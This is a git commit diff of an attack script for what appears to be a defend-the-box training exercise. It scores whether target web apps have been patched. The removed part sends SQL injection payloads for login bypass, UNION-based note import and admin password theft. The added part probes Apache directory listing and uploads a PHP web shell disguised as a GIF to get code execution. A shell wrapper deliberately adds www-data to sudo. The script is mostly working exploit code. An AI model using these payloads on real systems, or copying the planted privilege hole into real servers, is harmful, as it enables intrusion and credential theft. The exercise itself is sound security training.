5598bec8857cc32c0a34260a65c79c587725411f
Emil desktop <emilhoerning@gmail.com>
2020-12-14 11:59:31 +0100

    attack script for it

--- machines/docker/attacker/2-defender-misconfiguretown/misconfigure_pwn.py
+++ machines/docker/attacker/2-defender-misconfiguretown/misconfigure_pwn.py
@@ -4,8 +4,8 @@ import time
 import socket
 import subprocess
 import requests
+import re
 
-bypassable = False
 if(len(sys.argv) != 3):
     print("Script takes 2 argument; IP address of host. to attack and the campaign managers ip")
     exit()
@@ -24,93 +24,80 @@ time.sleep(20)
 #############  REQUESTS  #############
 
 
-bypassable = False
-idinjectable = False
-importinjectable = False
-passwordgrabbable = False
-#SQL INJECT BYPASS LOGIN
+listdirs = False
+showbackup = False
+uploadphp = False
+codeexecution = False
 
-session = requests.session()
-burp0_url = "http://"+target_ip+":80/login/"
-burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/login/", "Upgrade-Insecure-Requests": "1"}
-burp0_data = {"username": "admin", "password": "' OR 1=1 -- -"}
-res = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
+
+#view directories in apache
+res = requests.get("http://"+target_ip+"/uploads")
 print(res.text)
-if "Note Overview" in res.text:
-    bypassable=True
-    print("I can bypass login with `' OR 1=1 -- -` and read admin notes.")
+if "<title>Index of /uploads" in res.text:
+    listdirs=True
+    print("I can list the dirs.")
 time.sleep(2)
-#CREATE USER IF NOT BYPASSABLE AND THEN LOGIN
-if(not bypassable):
-    burp0_url = "http://"+target_ip+":80/register/"
-    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/register/", "Upgrade-Insecure-Requests": "1"}
-    burp0_data = {"username": "testuser", "password": "testuser"}
-    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
-
-    time.sleep(2)
-
-    burp0_url = "http://"+target_ip+":80/login/"
-    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/login/", "Upgrade-Insecure-Requests": "1"}
-    burp0_data = {"username": "testuser", "password": "testuser"}
-    session.post(burp0_url, headers=burp0_headers, data=burp0_data)
-    
-#Now a session exists. Check if we can inject in new notes.
-time.sleep(2)
-#Check if we can make a note where we specify ID
-burp0_url = "http://"+target_ip+":80/notes/"
-burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/notes/", "Upgrade-Insecure-Requests": "1"}
-burp0_data = {"noteinput": "message', 123); -- -", "submit_button": "add note"}
-r = session.post(burp0_url, headers=burp0_headers,  data=burp0_data)
-if("Note ID: 123" in r.text):
-    idinjectable = True
-    print("managed to inject id param")
-time.sleep(2)
-#Check if we can import any note from id.
-burp0_url = "http://"+target_ip+":80/notes/"
-burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/notes/", "Upgrade-Insecure-Requests": "1"}
-burp0_data = {"noteid": "0 UNION SELECT * FROM notes WHERE id=1-- -", "submit_button": "import note"}
-r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
-if("Note ID: 1234567890" in r.text):
-    importinjectable = True
-    print("managed to import any note from id")
-time.sleep(2)
-#Check if we can steal passwords by making a new note.
-burp0_url = "http://"+target_ip+":80/notes/"
-burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://"+target_ip+"", "Connection": "close", "Referer": "http://"+target_ip+"/notes/", "Upgrade-Insecure-Requests": "1"}
-burp0_data = {"noteinput": "'||(SELECT password FROM users WHERE username=\"admin\")||'", "submit_button": "add note"}
-r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
-if("password" in r.text):
-    passwordgrabbable = True
-    print("managed to steal passwords by making a new note.")
 
 
+#view backups folder 
+res = requests.get("http://"+target_ip+"/backups")
+print(res.text)
+if "<title>Index of /backups" in res.text:
+    showbackup=True
+    print("I can see the backup content.")
+time.sleep(2)
+
+#Check if we can upload php files.
+f = open("upload.gif.php","w+")
+f.write("GIF89a<?php system('whoami');?>")
+f.close()
+
+uploadedFile = ""
+g = open("upload.gif.php","rb")
+files = {"fileToUpload":g}
+res = requests.post("http://"+target_ip+"/upload.php",files=files)
+if("The file has been uploaded." in res.text and ".php" in res.text):
+    uploadedFile = re.findall('href=(.+)>This', res.text)[0]
+    uploadphp = True
+    print("uploaded php file")
+    print("the file was"+str(files))
+    print(uploadedFile+"was where it was put")
+time.sleep(2)
+
+#Check if it executes system code
+if(uploadphp):
+    res = requests.get("http://"+target_ip+"/"+uploadedFile)
+    if("www-data" in res.text):
+        codeexecution = True
+        print("managed to get code execution")
+time.sleep(2)
 
 toPost= {
-    "attackName": "notessqli",
+    "attackName": "misconfiguretown",
     "checks": [
         {
-            "name": "bypass login",
-            "description": "True if sqli allows bypassing login",
-            "patched": not bypassable,
+            "name": "List dirs",
+            "description": "True if apache is still misconfigured for me to list content of dirs",
+            "patched": not listdirs,
             "score": 20
         },
         {
-            "name": "Inject in ID",
-            "description": "True if you can still inject sql in the id field.",
-            "patched": not idinjectable,
-            "score": 10
-        },
-        {
-            "name": "Import any note",
-            "description": "True if you could still do sqli in the note import field.",
-            "patched": not importinjectable,
+            "name": "Show backup",
+            "description": "True if you can still view the backup folder.",
+            "patched": not showbackup,
             "score": 30
         },
         {
-            "name": "Password grabbable",
-            "description": "True if an attacker can import a note that contains another users password",
-            "patched": not passwordgrabbable,
-            "score": 50
+            "name": "Upload php",
+            "description": "True if you can still upload .php files by cheating mime check.",
+            "patched": not uploadphp,
+            "score": 40
+        },
+        {
+            "name": "Execute php",
+            "description": "True if an attacker can execute the php code that he/she has uploaded",
+            "patched": not codeexecution,
+            "score": 40
         }
     ]
 }
--- machines/docker/defenders/2-defender-misconfiguretown/wrapper.sh
+++ machines/docker/defenders/2-defender-misconfiguretown/wrapper.sh
@@ -1,6 +1,7 @@
 #!/bin/sh
 
 echo root:$1 |chpasswd
+usermod -aG sudo www-data
 chown -R www-data:www-data /var/www/public
 cron
 /usr/sbin/sshd
